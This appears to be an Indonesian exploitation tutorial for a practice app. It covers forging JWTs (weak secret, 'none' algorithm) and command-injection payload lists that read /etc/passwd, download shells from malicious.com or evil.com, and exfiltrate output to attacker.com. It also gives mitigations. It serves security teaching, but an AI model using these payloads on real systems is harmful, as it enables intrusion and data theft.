# Panduan Eksploitasi Kerentanan

## 1. Insecure JWT Vulnerability

### Analisis Token

Setelah login, Anda akan mendapatkan JWT token. Mari analisis strukturnya:

**Contoh Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.YourSignature
```

**Structure:**
- Header: `{"alg":"HS256","typ":"JWT"}`
- Payload: `{"id":1,"username":"admin","role":"admin"}`
- Signature: Signed dengan secret "secret"

### Eksploitasi JWT

#### 1. Token Decode
```bash
# Decode header (Base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

# Decode payload (Base64)  
echo "eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9" | base64 -d
```

#### 2. Brute Force Secret
Secret yang digunakan sangat lemah ("secret"), bisa di-brute force dengan tools seperti:
- hashcat
- john the ripper
- jwt-cracker

#### 3. Algorithm Confusion Attack
Server menerima algoritma 'none', kita bisa membuat token tanpa signature:

**Header:** `{"alg":"none","typ":"JWT"}`
**Payload:** `{"id":1,"username":"admin","role":"admin"}`

```bash
# Base64 encode header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='

# Base64 encode payload  
echo -n '{"id":1,"username":"admin","role":"admin"}' | base64 | tr -d '='

# Combine: header.payload.
# Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

## 2. Command Injection Vulnerability

### Target Endpoints

#### Ping Endpoint (`/api/ping`)
**Input Field:** `host`
**Vulnerable Code:**
```javascript
const command = `ping -c 4 ${host}`;
exec(command, callback);
```

#### System Info Endpoint (`/api/system-info`)  
**Input Field:** `command`
**Vulnerable Code:**
```javascript
exec(command, callback);
```

### Eksploitasi Command Injection

#### Basic Injection Techniques

**1. Command Chaining (;)**
```bash
google.com; whoami
google.com; ls -la
google.com; cat /etc/passwd
```

**2. Command Chaining (&&)**
```bash
google.com && whoami
google.com && dir
google.com && echo "Injected!"
```

**3. Command Chaining (&)** - Windows
```bash
google.com & dir C:\
google.com & type important.txt
google.com & net user
```

**4. Pipe (|)**
```bash
google.com | cat /etc/hosts
google.com | dir
google.com | whoami
```

#### Advanced Payloads

**Information Gathering:**
```bash
# Windows
google.com & systeminfo
google.com & net user
google.com & dir C:\Users
google.com & ipconfig /all

# Linux/Unix
google.com; uname -a
google.com; ps aux
google.com; netstat -an
google.com; id
```

**File Operations:**
```bash
# Read files
google.com & type C:\Windows\System32\drivers\etc\hosts
google.com; cat /etc/passwd

# List directories
google.com & dir /s C:\
google.com; find / -name "*.conf"

# Create files
google.com & echo "hacked" > hacked.txt
google.com; echo "payload" > /tmp/test
```

**Network Operations:**
```bash
# Port scanning
google.com; nmap localhost
google.com & netstat -an

# Download files (if available)
google.com; wget http://malicious.com/shell.sh
google.com & powershell -c "Invoke-WebRequest -Uri http://evil.com/payload"
```

#### Blind Command Injection

Jika output tidak terlihat, gunakan teknik blind:

**1. Time-based:**
```bash
google.com; sleep 10
google.com & ping -n 10 127.0.0.1
```

**2. DNS/HTTP exfiltration:**
```bash
google.com; nslookup $(whoami).attacker.com
google.com; curl http://attacker.com/$(id)
```

**3. File-based:**
```bash
google.com; whoami > /tmp/output.txt
google.com & dir > C:\temp\output.txt
```

### Testing Methodology

#### 1. Detection
- Coba input normal: `google.com`
- Coba injection simple: `google.com; whoami`
- Lihat response time dan output

#### 2. Exploitation
- Identifikasi OS (Windows/Linux)
- Eksekusi command sesuai OS
- Ekstrak informasi sensitif

#### 3. Impact Assessment
- Akses file sistem
- Eksekusi command dengan privilege user
- Potensi privilege escalation
- Network reconnaissance

## Mitigasi

### JWT Security
1. **Strong Secret:** Gunakan secret yang panjang dan kompleks
2. **Expiration:** Set waktu kadaluarsa token
3. **Algorithm Whitelist:** Hanya terima algoritma yang aman
4. **Token Validation:** Validasi semua field token
5. **Token Rotation:** Implement refresh token mechanism

### Command Injection Prevention
1. **Input Validation:** Whitelist karakter yang diizinkan
2. **Parameterized Commands:** Hindari string concatenation
3. **Sandboxing:** Jalankan command di environment terbatas
4. **Privilege Separation:** Gunakan user dengan akses minimal
5. **Output Filtering:** Filter output untuk menghindari information disclosure

## Tools untuk Testing

### JWT
- [JWT.io](https://jwt.io/) - Decode/encode JWT
- `jwt-cracker` - Brute force JWT secret
- `hashcat` - Crack JWT dengan wordlist

### Command Injection
- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Free security testing tool
- **Commix** - Command injection testing tool
- **Manual Testing** - Custom payloads

## Legal Notice

⚠️ **DISCLAIMER:** Informasi ini hanya untuk tujuan edukasi dan testing pada aplikasi sendiri. Jangan gunakan teknik ini untuk menyerang sistem yang bukan milik Anda tanpa izin eksplisit.